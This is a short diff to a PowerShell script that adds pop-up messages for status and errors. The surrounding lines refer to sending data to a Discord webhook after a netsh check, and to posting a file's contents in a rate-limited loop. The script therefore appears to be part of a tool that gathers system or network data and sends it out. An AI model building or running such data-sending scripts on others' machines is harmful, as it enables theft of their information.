@@ -62,12 +62,13 @@ try {
         } catch {
             #Write-Host "Failed to send data to Discord webhook"
         }
-
-        Add-Type -AssemblyName PresentationFramework
-        [System.Windows.MessageBox]::Show('netsh checked!', 'Notification')
     }
+    Add-Type -AssemblyName PresentationFramework
+    [System.Windows.MessageBox]::Show('Netsh checked!', 'Notification')
 } catch {
     #Write-Host "An error occurred: $($_.Exception.Message)"
+    Add-Type -AssemblyName PresentationFramework
+    [System.Windows.MessageBox]::Show("An error occurred: $($_.Exception.Message)", 'Notification')
 }
 
 ###############################################################################
@@ -153,10 +154,14 @@ if (Test-Path $filePath) {
             Start-Sleep -Seconds 1  # Optional: Pause briefly to avoid rate limits
         } catch {
             #Write-Host "Error sending request: $_"
+            Add-Type -AssemblyName PresentationFramework
+            [System.Windows.MessageBox]::Show("Error sending request: $_", 'Notification')
         }
     }
 } else {
     #Write-Host "File not found: $filePath"
+    Add-Type -AssemblyName PresentationFramework
+    [System.Windows.MessageBox]::Show("File not found: $filePath", 'Notification')
 }
 
 # End the transcript if you started one
